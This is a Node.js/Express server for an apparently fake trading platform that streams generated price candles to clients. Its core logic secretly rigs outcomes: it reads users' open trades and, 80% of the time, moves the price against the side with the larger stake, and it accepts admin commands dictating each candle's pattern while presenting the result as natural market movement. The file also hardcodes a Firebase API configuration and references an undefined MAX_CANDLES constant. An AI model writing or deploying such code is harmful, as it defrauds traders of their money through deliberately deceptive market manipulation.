// --- START: server.js (v28 - Indestructible Server & Auto-Pilot) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection (Render will never stop) ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;

// 🔥 ADMIN PROFIT CONTROL (Hardcoded) 🔥
const ADMIN_WIN_RATIO = 0.80; // 80% Win Rate for Admin

const markets = {}; 
const activeTradesDb = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Firebase Realtime Listener ---
db.ref('admin/markets').on('value', (snapshot) => {
    try {
        const fbMarkets = snapshot.val() || {};
        
        Object.keys(fbMarkets).forEach(marketKey => {
            const nodeData = fbMarkets[marketKey] || {};

            // Initialize if it doesn't exist
            if (!markets[marketKey]) {
                console.log(`[SYSTEM] Initializing market: ${nodeData.name || marketKey}`);
                initializeNewMarket(marketKey);
            }

            activeTradesDb[marketKey] = nodeData.activeTrades || {};

            // Admin Manual Command execution
            if (nodeData.nextCandleCommand && markets[marketKey]) {
                markets[marketKey].nextCandleCommand = nodeData.nextCandleCommand;
                console.log(`[ADMIN COMMAND] Market: ${nodeData.name || marketKey} => Pattern: ${nodeData.nextCandleCommand}`);
                db.ref(`admin/markets/${marketKey}/nextCandleCommand`).remove().catch(()=>{});
            }
        });
    } catch (error) {
        console.error("Firebase Listener Error:", error);
    }
});

// 1. Natural Market Generation
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    
    const volatility = safeOpen * (0.00005 + Math.random() * 0.00015);
    const body = volatility * (0.2 + Math.random() * 0.6);
    const close = isGreen ? safeOpen + body : safeOpen - body;
    
    const upperWick = volatility * Math.random() * 0.5;
    const lowerWick = volatility * Math.random() * 0.5;

    const high = Math.max(safeOpen, close) + upperWick;
    const low = Math.min(safeOpen, close) - lowerWick;

    if (isLive) {
        return {
            timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
            targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), isPredetermined: true, isNatural: true 
        };
    }
    return { timestamp, open: roundPrice(safeOpen), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close) };
}

// 2. Exact Pattern Generator
function generateDynamicCandle(timestamp, open, command) {
    let bodySize, upperWick, lowerWick, close, high, low;
    const volatility = open * (0.00008 + Math.random() * 0.0001);

    switch (command) {
        case 'GREEN': 
            bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        case 'RED': 
            bodySize = volatility; close = open - bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        case 'BULLISH_MARUBOZU': 
            bodySize = volatility * 2.5; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU': 
            bodySize = volatility * 2.5; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'GREEN_HAMMER': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = volatility * 0.1; lowerWick = bodySize * 3; break;
        case 'RED_HAMMER': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = volatility * 0.1; lowerWick = bodySize * 3; break;
        case 'GREEN_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = bodySize * 3; lowerWick = volatility * 0.1; break;
        case 'RED_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = bodySize * 3; lowerWick = volatility * 0.1; break;
        case 'DOJI': 
            bodySize = open * 0.000005; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility; lowerWick = volatility; break;
        case 'HUGE_PUMP': 
            bodySize = volatility * 4; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'HUGE_DUMP': 
            bodySize = volatility * 4; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        default: 
            bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2;
    }
    
    high = Math.max(open, close) + upperWick; 
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open), 
        isPredetermined: true, isNatural: false, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = 1.15; 

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) currentPrice = liveSnap.val().price;
    } catch (e) {}

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false);
        candles.push(c);
        currentPrice = c.close;
    }
    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice };
}

// 🔥 CORE LOGIC: Determines next candle outcome
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle = null;
        
        // 1. Manual Admin Command
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
            marketData.nextCandleCommand = null; 
        } 
        
        // 2. Smart Auto-Pilot
        if (!newCandle) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let upVol = 0, downVol = 0;
            
            Object.values(trades).forEach(t => {
                if (t.direction === 'UP') upVol += t.amount;
                if (t.direction === 'DOWN') downVol += t.amount;
            });

            if (upVol > 0 || downVol > 0) {
                if (Math.random() < ADMIN_WIN_RATIO) {
                    const targetDirection = upVol > downVol ? 'RED' : 'GREEN';
                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                    newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                }
            }
        }
        
        // 3. Natural Market
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// Tick Engine
function updateRealisticPrice(marketData, candle, currentPeriod) {
    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    
    if (candle.isPredetermined) {
        const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
        const easeProgress = 1 - Math.pow(1 - progress, 3); 
        let idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
        
        const noiseFactor = 1 - Math.pow(progress, 2); 
        const volatility = candle.open * 0.00008;
        const noise = (Math.sin(now / 200) + Math.cos(now / 350)) * volatility * noiseFactor;
        
        marketData.currentPrice = idealPrice + noise;

        marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
        marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

        // LOCK price
        if (timeElapsed >= TIMEFRAME - 1500) {
            marketData.currentPrice = candle.targetClose;
        }
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) }));
                }
            }
        } catch (_) {}
    });
});

let lastSyncTime = 0;
setInterval(() => {
    try {
        const now = Date.now();
        const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

        for (const marketId in markets) {
            const marketData = markets[marketId];
            let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
            if (!candle) continue;

            updateRealisticPrice(marketData, candle, currentPeriod); 
            broadcastCandle(marketId, candle);
        }

        if (now - lastSyncTime > 1500) {
            lastSyncTime = now;
            const batchUpdates = {};
            for (const marketId in markets) {
                const m = markets[marketId];
                if (m.currentPrice) {
                    batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
                }
            }
            if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
        }
    } catch (err) {
        console.error("Main Loop Error:", err);
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Backend V28 - Indestructible Server Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// --- END OF FILE ---